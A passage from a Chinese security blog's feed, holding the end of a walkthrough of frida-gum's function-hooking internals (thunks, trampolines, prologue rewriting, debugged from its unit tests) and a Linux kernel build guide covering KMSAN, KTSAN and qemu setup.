执行流程</h4><p>通过设置函数返回地址(<code>__gum_function_context_begin/end_invocation</code>)，控制流程，这就是ROP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C80204</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;enter_chunk&#96;  &#x2F;&#x2F; 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️</span><br><span class="line">&#96;__gum_function_context_begin_invocation&#96; &#x2F;&#x2F; 通过设置栈(ret addr)控制执行流程 </span><br><span class="line">----------------------------------------------------</span><br><span class="line">replacement_function</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C8020F</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;leave_chunk&#96;</span><br><span class="line">&#96;__gum_function_context_end_invocation&#96; </span><br><span class="line">----------------------------------------------------</span><br><span class="line">继续执行</span><br></pre></td></tr></table></figure><h2 id="0x03-调试分析帮助理解"><a href="#0x03-调试分析帮助理解" class="headerlink" title="0x03 : 调试分析帮助理解"></a>0x03 : 调试分析帮助理解</h2><p>这里调试了单元测试中写hook和函数替换的逻辑，过程如下：</p><p><code>_gum_interceptor_backend_create() </code></p><p>后端初始化，初始化两个thunk</p><p>enter_thunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00C30000  pushfd  </span><br><span class="line">00C30001  cld  </span><br><span class="line">00C30002  pushad  </span><br><span class="line">00C30003  lea         esp,[esp-4]  </span><br><span class="line">00C3000A  lea         eax,[esp+2Ch]  </span><br><span class="line">00C30011  mov         dword ptr [esp+10h],eax  </span><br><span class="line">00C30015  mov         ebx,dword ptr [esp+28h]  </span><br><span class="line">00C30019  mov         ebp,esp  </span><br><span class="line">00C3001B  and         esp,0FFFFFFF0h  </span><br><span class="line">00C30021  sub         esp,200h  </span><br><span class="line">00C30027  fxsave      [esp]  </span><br><span class="line">00C3002B  lea         esi,[ebp]  </span><br><span class="line">00C30031  lea         edx,[ebp+2Ch]  </span><br><span class="line">00C30037  lea         ecx,[ebp+28h]  </span><br><span class="line">00C3003D  push        ecx  </span><br><span class="line">00C3003E  push        edx  </span><br><span class="line">00C3003F  push        esi  </span><br><span class="line">00C30040  push        ebx  </span><br><span class="line">00C30041  call        __gum_function_context_begin_invocation (0CE8E1Fh)  </span><br><span class="line">00C30046  add         esp,10h  </span><br><span class="line">00C30049  fxrstor     [esp]  </span><br><span class="line">00C3004D  mov         esp,ebp  </span><br><span class="line">00C3004F  lea         esp,[esp+4]  </span><br><span class="line">00C30056  popad  </span><br><span class="line">00C30057  popfd  </span><br><span class="line">00C30058  ret </span><br></pre></td></tr></table></figure><p>leave_thunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00C30100  pushfd  </span><br><span class="line">00C30101  cld  </span><br><span class="line">00C30102  pushad  </span><br><span class="line">00C30103  lea         esp,[esp-4]  </span><br><span class="line">00C3010A  lea         eax,[esp+28h]  </span><br><span class="line">00C30111  mov         dword ptr [esp+10h],eax  </span><br><span class="line">00C30115  mov         ebx,dword ptr [esp+28h]  </span><br><span class="line">00C30119  mov         ebp,esp  </span><br><span class="line">00C3011B  and         esp,0FFFFFFF0h  </span><br><span class="line">00C30121  sub         esp,200h  </span><br><span class="line">00C30127  fxsave      [esp]  </span><br><span class="line">00C3012B  lea         esi,[ebp]  </span><br><span class="line">00C30131  lea         edx,[ebp+28h]  </span><br><span class="line">00C30137  sub         esp,4  </span><br><span class="line">00C3013A  push        edx  </span><br><span class="line">00C3013B  push        esi  </span><br><span class="line">00C3013C  push        ebx  </span><br><span class="line">00C3013D  call        __gum_function_context_end_invocation (0CEAB1Bh)  </span><br><span class="line">00C30142  add         esp,0Ch  </span><br><span class="line">00C30145  add         esp,4  </span><br><span class="line">00C30148  fxrstor     [esp]  </span><br><span class="line">00C3014C  mov         esp,ebp  </span><br><span class="line">00C3014E  lea         esp,[esp+4]  </span><br><span class="line">00C30155  popad  </span><br><span class="line">00C30156  popfd  </span><br><span class="line">00C30157  ret  </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook 构造</span></span><br><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach (GumInterceptor * self,</span><br><span class="line">                        gpointer function_address,</span><br><span class="line">                        GumInvocationListener * listener,</span><br><span class="line">                        gpointer listener_function_data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach (GumInterceptor * self,</span><br><span class="line">                        gpointer function_address,</span><br><span class="line">                        GumInvocationListener * listener,</span><br><span class="line">                        gpointer listener_function_data)</span><br><span class="line">&#123;</span><br><span class="line">  GumAttachReturn result = GUM_ATTACH_OK;</span><br><span class="line">  GumFunctionContext * function_ctx;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (gum_process_get_code_signing_policy () == GUM_CODE_SIGNING_REQUIRED)</span><br><span class="line">    <span class="keyword">goto</span> policy_violation;</span><br><span class="line"></span><br><span class="line">  gum_interceptor_ignore_current_thread (self);</span><br><span class="line">  GUM_INTERCEPTOR_LOCK (self);</span><br><span class="line">  gum_interceptor_transaction_begin (&amp;self-&gt;current_transaction);</span><br><span class="line">  self-&gt;current_transaction.is_dirty = TRUE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取hook目标函数的地址 </span></span><br><span class="line">  function_address = gum_interceptor_resolve (self, function_address);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取这个函数的 GumFunctionContext 对象</span></span><br><span class="line">  <span class="comment">// 没有就新建一个</span></span><br><span class="line">  <span class="comment">// 这里已经 准备好了跳板，写好了hook</span></span><br><span class="line">  <span class="comment">// 添加任务,设置相对应的回调函数</span></span><br><span class="line">  function_ctx = gum_interceptor_instrument (self, function_address);</span><br><span class="line">  <span class="keyword">if</span> (function_ctx == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">goto</span> wrong_signature;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (gum_function_context_has_listener (function_ctx, listener))</span><br><span class="line">    <span class="keyword">goto</span> already_attached;</span><br><span class="line">  <span class="comment">// 添加监听器</span></span><br><span class="line">  gum_function_context_add_listener (function_ctx, listener,</span><br><span class="line">      listener_function_data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">goto</span> beach;</span><br><span class="line"></span><br><span class="line">policy_violation:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> GUM_ATTACH_POLICY_VIOLATION;</span><br><span class="line">  &#125;</span><br><span class="line">wrong_signature:</span><br><span class="line">  &#123;</span><br><span class="line">    result = GUM_ATTACH_WRONG_SIGNATURE;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">already_attached:</span><br><span class="line">  &#123;</span><br><span class="line">    result = GUM_ATTACH_ALREADY_ATTACHED;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">beach:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 到这里，基本没什么问题，hook什么都打好了</span></span><br><span class="line">    <span class="comment">// 拦截器激活 跳板激活</span></span><br><span class="line">    <span class="comment">// 这里把原函数开头改写</span></span><br><span class="line">    gum_interceptor_transaction_end (&amp;self-&gt;current_transaction);</span><br><span class="line">    GUM_INTERCEPTOR_UNLOCK (self);</span><br><span class="line">    gum_interceptor_unignore_current_thread (self);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>on_invoke_trampoline 跳板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00C30200  mov         al,byte ptr ds:[FF00C121h]  </span><br><span class="line">00C30205  xor         eax,0C30200h  </span><br><span class="line">00C3020A  jmp         00C30000   &#x2F;&#x2F; 跳到上面的 enter_thunk</span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  &#x2F;&#x2F; 跳到 leave_thunk</span><br><span class="line">&#x2F;&#x2F; 原函数修复的指令，7个字节</span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h) &#x2F;&#x2F; 跳回原函数，因为写跳转用了7字节，所以+7</span><br></pre></td></tr></table></figure><p><code>gum_interceptor_transaction_end (&amp;self-&gt;current_transaction);</code> 调用 <code>gum_interceptor_activate()</code> 然后<code>_gum_interceptor_backend_activate_trampolie()</code> 随后，目标函数开头被修改：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gpointer GUM_NOINLINE</span><br><span class="line">gum_test_target_function (GString * str)</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">00</span>D6FB90  jmp         <span class="number">00</span>C30204  </span><br><span class="line">  <span class="keyword">if</span> (str != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">00</span>D6FB95  nop  </span><br><span class="line"><span class="number">00</span>D6FB96  nop  </span><br><span class="line"><span class="number">00</span>D6FB97  je          gum_test_target_function+<span class="number">19</span>h (<span class="number">0</span>D6FBA9h)  </span><br></pre></td></tr></table></figure><p>直接跳转到 <code>00C30204</code>, 其实就是 跳板，因为反汇编的地址差了点，所以开始的指令不太一样:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00C30204  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C3020A  jmp         00C30000  </span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  </span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h)  </span><br><span class="line">00C30226  add         byte ptr [eax],al  </span><br><span class="line">00C30228  add         byte ptr [eax],al  </span><br><span class="line">00C3022A  add         byte ptr [eax],al  </span><br><span class="line">00C3022C  add         byte ptr [eax],al  </span><br><span class="line">00C3022E  add         byte ptr [eax],al  </span><br></pre></td></tr></table></figure><p>调用流程调试分析，这里分两个情况，是否存在``replacement_function`</p><p>首先是不存在，只是打个hook(根据 <code>TESTCASE(attach_one);</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">call 原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;enter_chunk&#96;  &#x2F;&#x2F; 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️</span><br><span class="line">&#96;__gum_function_context_begin_invocation&#96; &#x2F;&#x2F; 通过设置栈(ret addr)控制执行流程 </span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板+n  (00C3021A) &#x2F;&#x2F; 执行原函数的 修复的若干字节</span><br><span class="line">----------------------------------------------------</span><br><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;leave_chunk&#96; </span><br><span class="line">&#96;__gum_function_context_end_invocation&#96;</span><br><span class="line">----------------------------------------------------</span><br><span class="line">继续执行....</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>存在替换的函数(<code>TESTCASE(replace_one);</code>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C80204</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;enter_chunk&#96;  &#x2F;&#x2F; 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️</span><br><span class="line">&#96;__gum_function_context_begin_invocation&#96; &#x2F;&#x2F; 通过设置栈(ret addr)控制执行流程 </span><br><span class="line">----------------------------------------------------</span><br><span class="line">replacement_function</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C8020F</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;leave_chunk&#96;</span><br><span class="line">&#96;__gum_function_context_end_invocation&#96; </span><br><span class="line">----------------------------------------------------</span><br><span class="line">继续执行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>replace_one 的跳板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">02C80204  push        dword ptr ds:[2C80200h]  </span><br><span class="line">02C8020A  jmp         02C80000  </span><br><span class="line">02C8020F  push        dword ptr ds:[2C80200h]  </span><br><span class="line">02C80215  jmp         02C80100  </span><br><span class="line">02C8021A  mov         edi,edi  </span><br><span class="line">02C8021C  push        ebp  </span><br><span class="line">02C8021D  mov         ebp,esp  </span><br><span class="line">02C8021F  jmp         malloc+5h (01E5A7B5h)  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04 : 结语"></a>0x04 : 结语</h2><p>这个过程大概花了我一周 5天多的样子，挺难的个人感觉，需要捋清楚的话，配合调试会好很多，最开始我直接看的代码，看+做笔记，脑内debug，最后编译了工程，vs调试，清晰多了，还是建议边调试边看。</p><p>如果文中有任何问题，欢迎批评指正  : ) </p><p>后面可能会在他基础上做点事情吧…这框架真牛逼 !</p><h2 id="0x05-参考与引用"><a href="#0x05-参考与引用" class="headerlink" title="0x05 : 参考与引用"></a>0x05 : 参考与引用</h2><p><a href="https://jmpews.github.io/2017/06/27/pwn/frida-gum%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/"><a href="https://jmpews.github.io/2017/06/27/pwn/frida-gum%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/">rida-gum源码解读</a></a></p><p><a href="https://blog.csdn.net/yanbixing123/article/details/52970804">gobject c语言</a></p><p><a href="https://bbs.pediy.com/thread-220794.htm">如何构建一款像 frida 一样的框架</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言与预备知识&quot;&gt;&lt;a href=&quot;#0x00-前言与预备知识&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 前言与预备知识&quot;&gt;&lt;/a&gt;0x00 : 前言与预备知识&lt;/h2&gt;&lt;p&gt;&lt;code&gt;frida&lt;/code&gt; :  frida是一个优秀的跨平台&lt;code&gt;Dynamic instrumentation toolkit&lt;/code&gt;，具体可以看&lt;a href=&quot;https://www.frida.re/&quot;&gt;官网介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/linux/l-gobject/index.html&quot;&gt;GObject对象系统&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="学习记录" scheme="http://o0xmuhe.me/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="frida" scheme="http://o0xmuhe.me/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>Linux Kernel 编译踩坑</title>
    <link href="http://o0xmuhe.me/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/"/>
    <id>http://o0xmuhe.me/2019/10/24/Linux-Kernel-%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91/</id>
    <published>2019-10-24T02:42:04.000Z</published>
    <updated>2020-06-20T11:11:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="env-config"><a href="#env-config" class="headerlink" title="env config"></a>env config</h2><p><code>ubuntu 18.04 amd64</code></p><a id="more"></a><h3 id="gcc-8"><a href="#gcc-8" class="headerlink" title="gcc-8"></a>gcc-8</h3><p>works on ubuntu 16.04 and 18.04</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r/<span class="built_in">test</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install gcc-8 g++-8</span><br><span class="line">gcc-8 --version</span><br></pre></td></tr></table></figure><h3 id="clang"><a href="#clang" class="headerlink" title="clang"></a>clang</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">R=348261</span><br><span class="line">svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/llvm/trunk llvm</span><br><span class="line"><span class="built_in">cd</span> llvm</span><br><span class="line">(<span class="built_in">cd</span> tools &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/cfe/trunk clang)</span><br><span class="line">(<span class="built_in">cd</span> projects &amp;&amp; svn co -r <span class="variable">$R</span> http://llvm.org/svn/llvm-project/compiler-rt/trunk compiler-rt)</span><br><span class="line">mkdir llvm_cmake_build &amp;&amp; <span class="built_in">cd</span> llvm_cmake_build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_ASSERTIONS=ON ../</span><br><span class="line">make -j64 clang</span><br><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br></pre></td></tr></table></figure><p>文档里<code>-j64</code>真的奢华…</p><h3 id="qemu-kvm"><a href="#qemu-kvm" class="headerlink" title="qemu kvm"></a>qemu kvm</h3><p>这部分推荐手动编译最新版本/较新版本，直接apt安装的版本有点老，后面可能有影响。</p><p>基本没啥坑，就是耗时耗力 :(</p><h2 id="build-kernel"><a href="#build-kernel" class="headerlink" title="build kernel"></a>build kernel</h2><h3 id="mainline"><a href="#mainline" class="headerlink" title="mainline"></a>mainline</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure><h3 id="linux-next"><a href="#linux-next" class="headerlink" title="linux-next"></a>linux-next</h3><p>一样的编译过程，next只是代码比较激进的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line">cp path/to/config .config</span><br><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure><h3 id="kmsan"><a href="#kmsan" class="headerlink" title="kmsan"></a>kmsan</h3><p>跟着readme走就行了</p><p>遇到一个坑点，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KMSAN_CLANG_PATH=`<span class="built_in">pwd</span>`/bin/clang</span><br><span class="line">...</span><br><span class="line">make CC=<span class="variable">$KMSAN_CLANG_PATH</span> -j64 -k 2&gt;&amp;1 | tee build.log</span><br></pre></td></tr></table></figure><p>直接这么编译有问题，试了几次都不行，提示说编译器不支持xxxx这类问题。<br>最后我尝试了:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=/path/to/clang</span><br></pre></td></tr></table></figure><p>之后直接编译就没问题了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make bzImage -j2</span><br></pre></td></tr></table></figure><p>这个版本我后面弄了个更新版本的clang也可以直接编译过。</p><h3 id="ktsan"><a href="#ktsan" class="headerlink" title="ktsan"></a>ktsan</h3><p>编译没啥坑，就是注意<code>.config</code>文件别乱改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/ktsan.git</span><br><span class="line"><span class="built_in">cd</span> ktsan/</span><br><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br><span class="line">scripts/config -e KTSAN -e SLAB -d SLUB -e DEBUG_INFO</span><br><span class="line">yes <span class="string">&#x27;&#x27;</span> | make oldconfig</span><br><span class="line">make -j2 LOCALVERSION=-tsan</span><br></pre></td></tr></table></figure><h2 id="run-kernel"><a href="#run-kernel" class="headerlink" title="run kernel"></a>run kernel</h2><p>创建文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">IMG=qemu-image.img</span><br><span class="line">DIR=mount-point.dir</span><br><span class="line">qemu-img create <span class="variable">$IMG</span> 10g</span><br><span class="line">mkfs.ext2 <span class="variable">$IMG</span></span><br><span class="line">mkdir <span class="variable">$DIR</span></span><br><span class="line">sudo mount -o loop <span class="variable">$IMG</span> <span class="variable">$DIR</span></span><br><span class="line">sudo debootstrap --arch amd64 jessie <span class="variable">$DIR</span></span><br><span class="line">sudo umount <span class="variable">$DIR</span></span><br><span class="line">rmdir <span class="variable">$DIR</span></span><br></pre></td></tr></table></figure><p>这样直接创建不行，需要在取消挂载之前设置好新文件系统里的用户名密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot mount-point.dir /bin/bash</span><br></pre></td></tr></table></figure><p>进去之后，直接修改root密码就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># passwd root</span></span><br></pre></td></tr></table></figure><p>其实还能做其他的设置，但是只是为了验证加载的内核是否正常，只需要登录进去就ok了。</p><p>基本上都能用这个命令起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-x86_64 \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-m 2G -smp 2 \</span><br><span class="line">-hda qemu-image.img  \</span><br><span class="line">-kernel linux-5.4-rc4/arch/x86/boot/bzImage \</span><br><span class="line">-append <span class="string">&quot;debug root=/dev/sda  console=ttyS0&quot;</span> \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure><p>除了ktsan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -drive file=qemu-image.img,index=0 \</span><br><span class="line">  -m 24G -smp 4 \</span><br><span class="line">  -net user,hostfwd=tcp::10022-:22 -net nic \</span><br><span class="line">  -nographic \</span><br><span class="line">  -kernel arch/x86/boot/bzImage -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw debug earlyprintk=serial slub_debug=QUZ&quot;</span>\</span><br><span class="line">  -enable-kvm -cpu host</span><br></pre></td></tr></table></figure><p>我用它wiki里的命令无法成功启动，各种panic，或者就是文件系统挂载出问题，我换了我原本的ext2的img之后多试几次，就能正常工作了。</p><p>我这里给的是<code>24G</code>内存。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/google/ktsan/wiki">ktsan</a><br><a href="https://github.com/google/kmsan">kmsan</a><br><a href="https://www.kernel.org/">linux-kernel</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;env-config&quot;&gt;&lt;a href=&quot;#env-config&quot; class=&quot;headerlink&quot; title=&quot;env config&quot;&gt;&lt;/a&gt;env config&lt;/h2&gt;&lt;p&gt;&lt;code&gt;ubuntu 18.04 amd64&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="环境配置踩坑" scheme="http://o0xmuhe.me/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/"/>
    
    
    <category term="Linux" scheme="http://o0xmuhe.me/tags/Linux/"/>
    
  </entry>
  
</feed>
